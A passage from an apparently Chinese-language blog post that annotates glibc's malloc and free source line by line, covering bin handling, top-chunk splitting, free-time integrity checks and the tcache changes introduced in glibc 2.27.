或者，如果这是一个小请求，则chunk是最近非完全匹配的剩余块。将其他已遍历的块放在bin中。    请注意，在任何例程中，这一步骤都是将块放置在bin中的唯一位置。    这里需要外循环，因为我们可能直到malloc接近尾声时才意识到我们应该合并，    所以必须这样做并重试。这种情况最多发生一次，而且只有当我们需要扩展内存来为“small”请求提供服务时才会发生   */  for (;; )    &#123;      int iters = 0;      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) //判断条件是unsorted bin不为空，并且此时使得victim指向unsorted 链表尾部        &#123;          bck = victim-&gt;bk;          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) //检测一：size大小最小最大检查              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                             chunk2mem (victim), av);          size = chunksize (victim);          /*             如果是个小请求，如果最近的remainder剩余块是unsortedbin当中唯一的块的话，            尝试使用他来分配  This helps promote locality for             runs of consecutive small requests. 这是最佳适配的唯一例外            并且适用于当这里没有最佳适配的小堆块           */          if (in_smallbin_range (nb) &amp;&amp;              bck == unsorted_chunks (av) &amp;&amp;              victim == av-&gt;last_remainder &amp;&amp;              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) //请求字节smallbin范围+unsortedbin只有一个堆块，同样也是last_remainder+这个剩余块size大于请求size            &#123;              /* split and reattach remainder */              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              if (!in_smallbin_range (remainder_size)) //如果剩余块为largebin范围                &#123;                  remainder-&gt;fd_nextsize = NULL;                  remainder-&gt;bk_nextsize = NULL;                &#125;              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;  //这里是划分出了相应堆块，直接返回            &#125;          /* 从unsorted 链表移除我们的victim */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);          /* Take now instead of binning if exact fit */          if (size == nb) //最佳适配            &#123;              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;          /* 走到这儿说明并没有最佳匹配，因此在这里就开始归还堆块给相应的bin */          if (in_smallbin_range (size)) //为smallbin范围            &#123;              victim_index = smallbin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;            &#125;          else //为largebin范围            &#123;              victim_index = largebin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;              /* maintain large bins in sorted order */              if (fwd != bck) //说明largebin链条不为空                &#123;                  /* Or with inuse bit to speed comparisons */                  size |= PREV_INUSE;                  /* if smaller than smallest, bypass loop below */                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) //这里我们知道largebin的链条尾部是最小堆块，所以这里如果小于最小堆块的话那么直接放入链表尾部                    &#123;                      fwd = bck;                      bck = bck-&gt;bk;                      victim-&gt;fd_nextsize = fwd-&gt;fd;                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                    &#125;                  else //若该堆块大于最小堆块，那么我们就从链头开始寻找，直至找到一个比他小的堆块，然后放到他前面                    &#123;                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                      while ((unsigned long) size &lt; fwd-&gt;size)                        &#123;                          fwd = fwd-&gt;fd_nextsize;                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                        &#125;                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)                        /* 如果是等于，总是插入小链条的第二个位置  */                        fwd = fwd-&gt;fd;                      else//如果是大于                        &#123;                          victim-&gt;fd_nextsize = fwd;                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize = victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                        &#125;                      bck = fwd-&gt;bk;                    &#125;                &#125;              else //如果largebin链条为空                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;            &#125;          mark_bin (av, victim_index);          victim-&gt;bk = bck;          victim-&gt;fd = fwd;          fwd-&gt;bk = victim;          bck-&gt;fd = victim;#define MAX_ITERS       10000          if (++iters &gt;= MAX_ITERS)            break;        &#125;</code></pre><p>进入我们的外部大循环，上面源码仅仅展示了内部unsortedbin循环，这里要么有三种结果：</p><ol><li>在unsorted bin循环当中发现unsorted bin只有一个堆块，且大于我们要分配的，则切割他然后返回</li><li>循环当中找到适配的堆块并把寻找路径上的不适配堆块返回适当的bin当中，则直接返回，剩余的堆块不予处理</li><li>循环当中未找到合适堆块，则继续下一步，此时unsortedbin已经遍历完毕，其中无堆块，全部存放于适合的bin当中</li></ol><h3 id="step6-大循环-largebin堆块寻找"><a href="#step6-大循环-largebin堆块寻找" class="headerlink" title="step6 大循环-largebin堆块寻找"></a>step6 大循环-largebin堆块寻找</h3><p>经过unsortedbin循环之后，我们再来判断</p><pre><code class="hljs"> /*         如果是large请求, 寻找最小适配块.  Use the skip list for this.       */      if (!in_smallbin_range (nb))        &#123;          bin = bin_at (av, idx);          /* skip scan if empty or largest chunk is too small */          if ((victim = first (bin)) != bin &amp;&amp;              (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //判断非空且最大块大于请求nb            &#123;              victim = victim-&gt;bk_nextsize;              while (((unsigned long) (size = chunksize (victim)) &lt;                      (unsigned long) (nb))) //从链表尾部开始遍历，寻找到大于或等于他的块                victim = victim-&gt;bk_nextsize;              /* Avoid removing the first entry for a size so that the skip                 list does not have to be rerouted.  */              if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) //如果victim不为最后一个块，且其中存在着fd指针指向的堆块，也就是说小链表当中有两个或以上的相同大小的堆块                victim = victim-&gt;fd; //始终取第二个              remainder_size = size - nb; //判断是否是非最佳适配，可能会多出部分              unlink (av, victim, bck, fwd); //脱链              /* Exhaust */              if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);                  if (av != &amp;main_arena)                    victim-&gt;size |= NON_MAIN_ARENA;                &#125;              /* Split */              else //这里是存在剩余部分，然后我们存放在unsiorted bin 当中                &#123;                  remainder = chunk_at_offset (victim, nb);                  /* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */                  bck = unsorted_chunks (av);                  fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))                    &#123;                      errstr = &quot;malloc(): corrupted unsorted chunks&quot;;                      goto errout;                    &#125;                  remainder-&gt;bk = bck;                  remainder-&gt;fd = fwd;                  bck-&gt;fd = remainder;                  fwd-&gt;bk = remainder;                  if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize = NULL;                      remainder-&gt;bk_nextsize = NULL;                    &#125;                  set_head (victim, nb | PREV_INUSE |                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                &#125;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;</code></pre><p>这里是从我们的largebin链表当中，从尾部开始遍历直到找到相同或者稍微大那么点的堆块，要么直接返回要么切割返回，切割的剩余部分存放在unsorted bin当中。</p><h3 id="step7-大循环-位图分配"><a href="#step7-大循环-位图分配" class="headerlink" title="step7 大循环-位图分配"></a>step7 大循环-位图分配</h3><p>然后接着往下走：</p><pre><code class="hljs">  /*         从下一个最大的bin开始，通过扫描bin来搜索chunk。        此搜索严格按照最佳匹配进行；即选择适合的最小的（具有接近最近最少使用的关系）块。         位图避免了检查大多数块是否为非空。        在预热阶段跳过所有存储箱的特殊情况下，还没有返回块，这比看起来更快。       */      ++idx;      bin = bin_at (av, idx);      block = idx2block (idx); //宏，右移5个bit位      map = av-&gt;binmap[block];      bit = idx2bit (idx);      for (;; )        &#123;          /* Skip rest of block if there are no more set bits in this block.  */          if (bit &gt; map || bit == 0)            &#123;              do                &#123;                  if (++block &gt;= BINMAPSIZE) /* out of bins */                    goto use_top;                &#125;              while ((map = av-&gt;binmap[block]) == 0);              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));              bit = 1;            &#125;          /* Advance to bin with set bit. There must be one. */          while ((bit &amp; map) == 0)            &#123;              bin = next_bin (bin);              bit &lt;&lt;= 1;              assert (bit != 0);            &#125;          /* Inspect the bin. It is likely to be non-empty */          victim = last (bin);          /*  If a false alarm (empty bin), clear the bit. */          if (victim == bin)            &#123;              av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */              bin = next_bin (bin);              bit &lt;&lt;= 1;            &#125;          else            &#123;              size = chunksize (victim);              /*  We know the first chunk in this bin is big enough to use. */              assert ((unsigned long) (size) &gt;= (unsigned long) (nb));              remainder_size = size - nb;              /* unlink */              unlink (av, victim, bck, fwd);              /* Exhaust */              if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);                  if (av != &amp;main_arena)                    victim-&gt;size |= NON_MAIN_ARENA;                &#125;              /* 切块，然后剩余的给unsorted bin */              else                &#123;                  remainder = chunk_at_offset (victim, nb);                  /* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */                  bck = unsorted_chunks (av);                  fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))                    &#123;                      errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;                      goto errout;                    &#125;                  remainder-&gt;bk = bck;                  remainder-&gt;fd = fwd;                  bck-&gt;fd = remainder;                  fwd-&gt;bk = remainder;                  /* advertise as last remainder */                  if (in_smallbin_range (nb))                    av-&gt;last_remainder = remainder;                  if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize = NULL;                      remainder-&gt;bk_nextsize = NULL;                    &#125;                  set_head (victim, nb | PREV_INUSE |                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                &#125;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;</code></pre><p>以上即为普通的位图分配，倒是省下了诸多麻烦，这里通过寻找最小适配块来进行切割，剩下的就分配给unsorted bin</p><h3 id="step7-使用top-chunk"><a href="#step7-使用top-chunk" class="headerlink" title="step7 使用top chunk"></a>step7 使用top chunk</h3><p>  use_top:<br>      &#x2F;*<br>         If large enough, split off the chunk bordering the end of memory<br>         (held in av-&gt;top). Note that this is in accord with the best-fit<br>         search rule.  In effect, av-&gt;top is treated as larger (and thus<br>         less well fitting) than any other available chunk since it can<br>         be extended to be as large as necessary (up to system<br>         limitations).</p><pre><code class="hljs">     We require that av-&gt;top always exists (i.e., has size &gt;=     MINSIZE) after initialization, so if it would otherwise be     exhausted by current request, it is replenished. (The main     reason for ensuring it exists is that we may need MINSIZE space     to put in fenceposts in sysmalloc.)   */  victim = av-&gt;top;  size = chunksize (victim);  if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) //如果topchunk够分配，直接切割    &#123;      remainder_size = size - nb;      remainder = chunk_at_offset (victim, nb);      av-&gt;top = remainder;      set_head (victim, nb | PREV_INUSE |                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));      set_head (remainder, remainder_size | PREV_INUSE);      check_malloced_chunk (av, victim, nb);      void *p = chunk2mem (victim);      alloc_perturb (p, bytes);      return p;    &#125;  /* When we are using atomic ops to free fast chunks we can get     here for all block sizes.  */  else if (have_fastchunks (av)) //如果topchunk不够，且有fastchunk，那么进行malloc_consolidate进行合并fast，然后在接着分配    &#123;      malloc_consolidate (av);      /* restore original bin index */      if (in_smallbin_range (nb))        idx = smallbin_index (nb);      else        idx = largebin_index (nb);    &#125;  /*     Otherwise, relay to handle system-dependent cases   */  else //如果上述都不满足，则调用系统分配    &#123;      void *p = sysmalloc (nb, av);      if (p != NULL)        alloc_perturb (p, bytes);      return p;    &#125;&#125;</code></pre><p>}</p><p>至此，malloc分配分析结束，下面附赠一张分配流程图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/11385343fbf2b2114ea2f2838f8065380dd78e6b.jpg"></p><h2 id="0x02-free-步骤"><a href="#0x02-free-步骤" class="headerlink" title="0x02 free 步骤"></a>0x02 free 步骤</h2><h3 id="step1-free判断"><a href="#step1-free判断" class="headerlink" title="step1 free判断"></a>step1 free判断</h3><p>首先就是我们的<code>__libc_free</code></p><pre><code class="hljs">    void __libc_free (void *mem)    &#123;      mstate ar_ptr;      mchunkptr p;                          /* chunk corresponding to mem */          void (*hook) (void *, const void *)        = atomic_forced_read (__free_hook); //__free_hook      if (__builtin_expect (hook != NULL, 0))        &#123;          (*hook)(mem, RETURN_ADDRESS (0));          return;        &#125;          if (mem == 0)                              /* free(0) has no effect */        return;          p = mem2chunk (mem);          if (chunk_is_mmapped (p))                       /* release mmapped memory. */        &#123;          /* see if the dynamic brk/mmap threshold needs adjusting */          if (!mp_.no_dyn_threshold              &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold              &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)            &#123;              mp_.mmap_threshold = chunksize (p);              mp_.trim_threshold = 2 * mp_.mmap_threshold;              LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                          mp_.mmap_threshold, mp_.trim_threshold);            &#125;          munmap_chunk (p);          return;        &#125;          ar_ptr = arena_for_chunk (p);      _int_free (ar_ptr, p, 0);    &#125;</code></pre><h3 id="step2-安全检查"><a href="#step2-安全检查" class="headerlink" title="step2 安全检查"></a>step2 安全检查</h3><pre><code class="hljs">static void_int_free (mstate av, mchunkptr p, int have_lock)&#123;  INTERNAL_SIZE_T size;        /* its size */  mfastbinptr *fb;             /* associated fastbin */  mchunkptr nextchunk;         /* next contiguous chunk */  INTERNAL_SIZE_T nextsize;    /* its size */  int nextinuse;               /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */  mchunkptr bck;               /* misc temp for linking */  mchunkptr fwd;               /* misc temp for linking */  const char *errstr = NULL;  int locked = 0;  size = chunksize (p);  /* Little security check which won&#39;t hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by &quot;design&quot; from some intruder.  */  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    &#123;      errstr = &quot;free(): invalid pointer&quot;;    errout:      if (!have_lock &amp;&amp; locked)        (void) mutex_unlock (&amp;av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    &#125;  /* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    &#123;      errstr = &quot;free(): invalid size&quot;;      goto errout;    &#125;  check_inuse_chunk(av, p);</code></pre><p>其中是对于一系列free参数的判断，我们看看即可</p><h3 id="step3-置入fastbin"><a href="#step3-置入fastbin" class="headerlink" title="step3 置入fastbin"></a>step3 置入fastbin</h3><p>首先如果判断其范围处于fastbin，则置入链表，当然，存在多个检测：）</p><pre><code class="hljs"> /*    If eligible, place chunk on a fastbin so it can be found    and used quickly in malloc.  */  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ()) //处于fastbin范围内#if TRIM_FASTBINS      /*    If TRIM_FASTBINS set, don&#39;t place chunks    bordering top into fastbins      */      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif      ) &#123;    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)    || __builtin_expect (chunksize (chunk_at_offset (p, size))                 &gt;= av-&gt;system_mem, 0))      &#123;    /* We might not have a lock at this point and concurrent modifications       of system_mem might have let to a false positive.  Redo the test       after getting the lock.  */    if (have_lock        || (&#123; assert (locked == 0);          mutex_lock(&amp;av-&gt;mutex);          locked = 1;          chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;          &#125;))      &#123;        errstr = &quot;free(): invalid next size (fast)&quot;;        goto errout;      &#125;    if (! have_lock)      &#123;        (void)mutex_unlock(&amp;av-&gt;mutex);        locked = 0;      &#125;      &#125;    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); //清空chunk内数据     set_fastchunks(av); //设置av-&gt;flag的fast位？这里还不甚了解    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin (av, idx);    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do      &#123;    /* 检查fastbin链表头部是不是我们释放的该块，此即为double free检测       (i.e., double free).  */    if (__builtin_expect (old == p, 0))      &#123;        errstr = &quot;double free or corruption (fasttop)&quot;;        goto errout;      &#125;    /* 检查我们fastbin里链表头部size是否相同于我们即将添加的块.  We can dereference OLD       only if we have the lock, otherwise it might have already been       deallocated.  See use of OLD_IDX below for the actual check.  */    if (have_lock &amp;&amp; old != NULL)      old_idx = fastbin_index(chunksize(old));    p-&gt;fd = old2 = old;      &#125;    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))      &#123;    errstr = &quot;invalid fastbin entry (free)&quot;;    goto errout;      &#125;  &#125;</code></pre><h3 id="step4-若不是fastbin，则该去哪儿呢"><a href="#step4-若不是fastbin，则该去哪儿呢" class="headerlink" title="step4 若不是fastbin，则该去哪儿呢"></a>step4 若不是fastbin，则该去哪儿呢</h3><pre><code class="hljs">/*    合并其他非mmap分配的chunk  */  else if (!chunk_is_mmapped(p)) &#123; //若释放的堆块并不是fastbin大小    if (! have_lock) &#123;      (void)mutex_lock(&amp;av-&gt;mutex);      locked = 1;    &#125;    nextchunk = chunk_at_offset(p, size);   ... //一系列检测    nextsize = chunksize(nextchunk);    if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0)    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))      &#123;    errstr = &quot;free(): invalid next size (normal)&quot;;    goto errout;      &#125;    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); //清空其中元素    /* 向后（backward）/上合并 */    if (!prev_inuse(p)) &#123;      prevsize = p-&gt;prev_size;      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;    if (nextchunk != av-&gt;top) &#123; //若nextchunk不是topchunk      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);      /* 向前（forward）/下合并 */      if (!nextinuse) &#123;    unlink(av, nextchunk, bck, fwd);    size += nextsize;      &#125; else    clear_inuse_bit_at_offset(nextchunk, 0);      /*    将该堆块置入unsorted bin. chunks直到下一次malloc的时候才会有机会置入合适的bins，此前一致存入unsorted bin      */      bck = unsorted_chunks(av);      fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))    &#123;      errstr = &quot;free(): corrupted unsorted chunks&quot;;      goto errout;    &#125;      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))    &#123;      p-&gt;fd_nextsize = NULL;      p-&gt;bk_nextsize = NULL;    &#125;      bck-&gt;fd = p;      fwd-&gt;bk = p;      set_head(p, size | PREV_INUSE);      set_foot(p, size);      check_free_chunk(av, p);    &#125;    /*      如果nextchunk是topchunk，此时我们就要将其合并入topchunk    */    else &#123;      size += nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top = p;      check_chunk(av, p);    &#125;        ···</code></pre><p>从源码可以得知除了fastbin范围，其他块均存入unsorted bin</p><p>至此，free的分析也就此结束，如果大伙是从上面的malloc看下来的，那么肯定会发现这个free较之于十分简单，其中也是因为一些重复的函数在malloc已经讲解过，再写一遍没有必要，其中我也省略了很多free过程当中的检测部分，因为这较之于我们今天分析的目的有点远了。</p><p>当然，附赠free过程图：</p><p><img src="http://imgsrc.baidu.com/form/pic/item/d6ca7bcb0a46f21f05de2f9eb3246b600d33ae11.jpg"></p><h2 id="0x03-glibc2-27版本差异"><a href="#0x03-glibc2-27版本差异" class="headerlink" title="0x03 glibc2.27版本差异"></a>0x03 glibc2.27版本差异</h2><p>我们都知道，在2.26及以上增加了tcache，其中使得我们存取块更加迅速，下面我们就来探讨一下其中较之于2.23的差别</p><h3 id="差异一：数据结构们"><a href="#差异一：数据结构们" class="headerlink" title="差异一：数据结构们"></a>差异一：数据结构们</h3><p>首先就是我们的tcache数据块，如下：</p><pre><code class="hljs">typedef struct tcache_entry&#123;  struct tcache_entry *next; //tcache链条&#125; tcache_entry;/* 每个线程都有这样的一个tcache数据管理结构体, which contains the   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping   overall size low is mildly important.  Note that COUNTS and ENTRIES   are redundant (we could have just counted the linked list each   time), this is for performance reasons.  */typedef struct tcache_perthread_struct&#123;  char counts[TCACHE_MAX_BINS]; //用一字节来代表一个tcache链表的数量  tcache_entry *entries[TCACHE_MAX_BINS]; //这里就是我们的链表指针数组&#125; tcache_perthread_struct;/* 一些宏定义 */#if USE_TCACHE/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */# define TCACHE_MAX_BINS64# define MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables.  */# define tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize(). 通过size定位tcache数组下标 */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT) /* When &quot;x&quot; is a user-provided size.  */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are...   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)   idx 1   bytes 25..40 or 13..20   idx 2   bytes 41..56 or 21..28   etc.  *//* This is another arbitrary limit, which tunables can change.  Each   tcache bin will hold at most this number of chunks.  */# define TCACHE_FILL_COUNT 7//// //定义最大一个链条的tcache数量#endif</code></pre><h3 id="差异二：-libc-malloc"><a href="#差异二：-libc-malloc" class="headerlink" title="差异二：__libc_malloc"></a>差异二：__libc_malloc</h3><p>我们在使用<code>__libc_malloc</code>进行分配时，在调用malloc_hook后，int_malloc前会首先调用tcache_get函数来获取相关堆块</p><pre><code class="hljs">void *__libc_malloc (size_t bytes)&#123;  mstate ar_ptr;  void *victim;  void *(*hook) (size_t, const void *)    = atomic_forced_read (__malloc_hook);    //malloc_hook  if (__builtin_expect (hook != NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE  /* int_free also calls request2size, be careful to not pad twice.  */  size_t tbytes;  checked_request2size (bytes, tbytes);  size_t tc_idx = csize2tidx (tbytes); //获取tcache对应size下标  MAYBE_INIT_TCACHE ();  DIAG_PUSH_NEEDS_COMMENT;  if (tc_idx &lt; mp_.tcache_bins      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */      &amp;&amp; tcache      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)    &#123;      return tcache_get (tc_idx); //直接从tcache取    &#125;  DIAG_POP_NEEDS_COMMENT;#endif</code></pre><hr><h4 id="题外话：tcache-get"><a href="#题外话：tcache-get" class="headerlink" title="题外话：tcache_get"></a>题外话：tcache_get</h4><pre><code class="hljs">/* Caller must ensure that we know tc_idx is valid and there&#39;s   available chunks to remove.  */static __always_inline void *tcache_get (size_t tc_idx)&#123;  tcache_entry *e = tcache-&gt;entries[tc_idx];   assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next; //从tcache链表头部取得堆块返回  --(tcache-&gt;counts[tc_idx]);  return (void *) e;&#125;</code></pre><p>结束，继续malloc</p><hr><h3 id="差异三：-int-malloc"><a href="#差异三：-int-malloc" class="headerlink" title="差异三：_int_malloc"></a>差异三：_int_malloc</h3><p>这里的差异即为在察觉到请求size是fastbin范围时，多的是下面那个<code>#if~#endif</code></p><pre><code class="hljs">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))    &#123;      idx = fastbin_index (nb);      mfastbinptr *fb = &amp;fastbin (av, idx);      mchunkptr pp;      victim = *fb;      if (victim != NULL)    &#123;      if (SINGLE_THREAD_P)        *fb = victim-&gt;fd;      else        REMOVE_FB (fb, pp, victim);      if (__glibc_likely (victim != NULL))        &#123;          size_t victim_idx = fastbin_index (chunksize (victim));          if (__builtin_expect (victim_idx != idx, 0))        malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);          check_remalloced_chunk (av, victim, nb);#if USE_TCACHE          /* 当我们运行至此, 如果fastbin该链条仍有其他堆块，则我们stash他们到tcache链条上*/          size_t tc_idx = csize2tidx (nb);          if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count //不能超过7奥             &amp;&amp; (tc_victim = *fb) != NULL)            &#123;              if (SINGLE_THREAD_P)            *fb = tc_victim-&gt;fd;              else            &#123;              REMOVE_FB (fb, pp, tc_victim);              if (__glibc_unlikely (tc_victim == NULL))                break;            &#125;              tcache_put (tc_victim, tc_idx); //这里注意均为从头置入            &#125;        &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p; //搞完后正常返回堆块        &#125;    &#125;    &#125;</code></pre><p>这里就是在我们分配fastbin的时候，若链条上还有其他堆块，我们则需要将其中剩下的free堆块头插入tcache当中，调试源码会发现顺序刚好相反，因为是从fastbin头取，再头插至tcachebin</p><p>除了fastbin，还有在我们smallbin找到堆块时，若链表中也有剩余块，其也会用相同的手法头插入tcachebin当中，但是这里有个区别就是smallbin由于是从尾部取堆块，而不是跟fastbin一样从头取，关键区别如下（这里就不写其他的部分了）：</p><pre><code class="hljs">#if USE_TCACHE      /* While we&#39;re here, if we see other chunks of the same size,         stash them in the tcache.  */      size_t tc_idx = csize2tidx (nb);      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks over.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = last (bin)) != bin)        &#123;          if (tc_victim != 0)            &#123;              bck = tc_victim-&gt;bk; //从bk取，一直向上              set_inuse_bit_at_offset (tc_victim, nb);              if (av != &amp;main_arena)            set_non_main_arena (tc_victim);              bin-&gt;bk = bck;              bck-&gt;fd = bin;              tcache_put (tc_victim, tc_idx);                &#125;        &#125;        &#125;#endif</code></pre><p>然后就是在for(;;)大循环的时候，unsorted bin while循环置入合适堆块bins的时候，首先会先置入tcache bins 而不是寻找到相应bins置入<br>如下：</p><pre><code class="hljs">         /* remove from unsorted list */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);          /* Take now instead of binning if exact fit */          if (size == nb)            &#123;              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)        set_non_main_arena (victim);#if USE_TCACHE          /* Fill cache first, return to user only if cache fills.         We may return one of these chunks later.  */          if (tcache_nb          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)        &#123;          tcache_put (victim, tc_idx); //tcache始终是第一位，堆块们想要回到合适的bins太难了：(          return_cached = 1;          continue;        &#125;          else        &#123;#endif</code></pre><h3 id="差异四：-int-free"><a href="#差异四：-int-free" class="headerlink" title="差异四：_int_free"></a>差异四：_int_free</h3><p>其中差异便是在调用<code>_int_free</code>时首先会调用<code>tcache_put</code></p><pre><code class="hljs">/*   ------------------------------ free ------------------------------ */static void_int_free (mstate av, mchunkptr p, int have_lock)&#123;  INTERNAL_SIZE_T size;        /* its size */  mfastbinptr *fb;             /* associated fastbin */  mchunkptr nextchunk;         /* next contiguous chunk */  INTERNAL_SIZE_T nextsize;    /* its size */  int nextinuse;               /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */  mchunkptr bck;               /* misc temp for linking */  mchunkptr fwd;               /* misc temp for linking */  size = chunksize (p);  /* Little security check which won&#39;t hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by &quot;design&quot; from some intruder.  */  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    malloc_printerr (&quot;free(): invalid pointer&quot;);  /* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    malloc_printerr (&quot;free(): invalid size&quot;);  check_inuse_chunk(av, p);#if USE_TCACHE  &#123;    size_t tc_idx = csize2tidx (size); //若free堆块大小处于tcachebin范围当中的话，执行下面语句    if (tcache    